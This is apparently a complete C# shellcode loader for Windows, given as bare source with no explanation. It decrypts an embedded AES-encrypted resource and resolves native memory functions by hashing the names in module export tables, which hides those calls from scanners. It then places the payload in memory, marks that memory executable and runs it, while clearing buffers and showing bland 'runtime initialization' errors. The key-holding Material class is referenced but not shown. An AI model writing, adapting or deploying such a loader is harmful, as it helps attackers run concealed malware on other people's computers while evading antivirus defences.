using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

internal static class Program
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int N0(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        UIntPtr zeroBits,
        ref UIntPtr regionSize,
        uint allocationType,
        uint protection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int N1(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        ref UIntPtr regionSize,
        uint protection,
        ref uint oldProtection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int N2();

    private const uint H0 = 0xCA67B978;
    private const uint H1 = 0xBD799926;

    private static int Main()
    {
        byte[] encrypted = null;
        byte[] clear = null;

        try
        {
            encrypted = ReadResource();
            clear = Decode(encrypted);

            IntPtr allocateAddress = FindExport(H0);
            IntPtr protectAddress = FindExport(H1);
            if (allocateAddress == IntPtr.Zero || protectAddress == IntPtr.Zero)
                throw new InvalidOperationException("Runtime initialization failed (1).");

            N0 allocate = (N0)Marshal.GetDelegateForFunctionPointer(allocateAddress, typeof(N0));
            N1 protect = (N1)Marshal.GetDelegateForFunctionPointer(protectAddress, typeof(N1));

            IntPtr region = IntPtr.Zero;
            UIntPtr regionSize = new UIntPtr((uint)clear.Length);
            int status = allocate(new IntPtr(-1), ref region, UIntPtr.Zero, ref regionSize, 0x3000, 0x04);
            if (status != 0 || region == IntPtr.Zero)
                throw new InvalidOperationException("Runtime initialization failed (2): " + status.ToString("X8"));

            Marshal.Copy(clear, 0, region, clear.Length);
            Array.Clear(clear, 0, clear.Length);

            uint previous = 0;
            IntPtr protectedRegion = region;
            UIntPtr protectedSize = regionSize;
            status = protect(new IntPtr(-1), ref protectedRegion, ref protectedSize, 0x20, ref previous);
            if (status != 0)
                throw new InvalidOperationException("Runtime initialization failed (3): " + status.ToString("X8"));

            N2 entry = (N2)Marshal.GetDelegateForFunctionPointer(region, typeof(N2));
            return entry();
        }
        catch (Exception exception)
        {
            Console.Error.WriteLine(exception.Message);
            return 1;
        }
        finally
        {
            if (encrypted != null)
                Array.Clear(encrypted, 0, encrypted.Length);
            if (clear != null)
                Array.Clear(clear, 0, clear.Length);
        }
    }

    private static byte[] ReadResource()
    {
        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("p"))
        {
            if (stream == null)
                throw new InvalidOperationException("Runtime initialization failed (0).");

            byte[] data = new byte[checked((int)stream.Length)];
            int offset = 0;
            while (offset < data.Length)
            {
                int read = stream.Read(data, offset, data.Length - offset);
                if (read == 0)
                    throw new EndOfStreamException();
                offset += read;
            }
            return data;
        }
    }

    private static byte[] Decode(byte[] input)
    {
        byte[] key = Material.Key();
        byte[] iv = Material.Iv();
        try
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;
                using (ICryptoTransform transform = aes.CreateDecryptor())
                    return transform.TransformFinalBlock(input, 0, input.Length);
            }
        }
        finally
        {
            Array.Clear(key, 0, key.Length);
            Array.Clear(iv, 0, iv.Length);
        }
    }

    private static IntPtr FindExport(uint wanted)
    {
        foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
        {
            try
            {
                IntPtr baseAddress = module.BaseAddress;
                int peOffset = Marshal.ReadInt32(baseAddress, 0x3c);
                IntPtr nt = Add(baseAddress, peOffset);
                if ((uint)Marshal.ReadInt32(nt) != 0x00004550)
                    continue;

                IntPtr optional = Add(nt, 24);
                ushort magic = (ushort)Marshal.ReadInt16(optional);
                int directoryOffset = magic == 0x20b ? 112 : magic == 0x10b ? 96 : -1;
                if (directoryOffset < 0)
                    continue;

                int exportRva = Marshal.ReadInt32(optional, directoryOffset);
                int exportSize = Marshal.ReadInt32(optional, directoryOffset + 4);
                if (exportRva == 0 || exportSize == 0)
                    continue;

                IntPtr exports = Add(baseAddress, exportRva);
                int nameCount = Marshal.ReadInt32(exports, 24);
                int functionTable = Marshal.ReadInt32(exports, 28);
                int nameTable = Marshal.ReadInt32(exports, 32);
                int ordinalTable = Marshal.ReadInt32(exports, 36);

                for (int i = 0; i < nameCount; i++)
                {
                    int nameRva = Marshal.ReadInt32(Add(baseAddress, nameTable), i * 4);
                    if (Hash(Add(baseAddress, nameRva)) != wanted)
                        continue;

                    ushort ordinal = (ushort)Marshal.ReadInt16(Add(baseAddress, ordinalTable), i * 2);
                    int functionRva = Marshal.ReadInt32(Add(baseAddress, functionTable), ordinal * 4);
                    if (functionRva >= exportRva && functionRva < exportRva + exportSize)
                        break;
                    return Add(baseAddress, functionRva);
                }
            }
            catch
            {
            }
        }
        return IntPtr.Zero;
    }

    private static uint Hash(IntPtr text)
    {
        uint value = 2166136261;
        for (int i = 0; ; i++)
        {
            byte current = Marshal.ReadByte(text, i);
            if (current == 0)
                return value;
            value ^= current;
            value *= 16777619;
        }
    }

    private static IntPtr Add(IntPtr pointer, int offset)
    {
        return new IntPtr(pointer.ToInt64() + offset);
    }
}
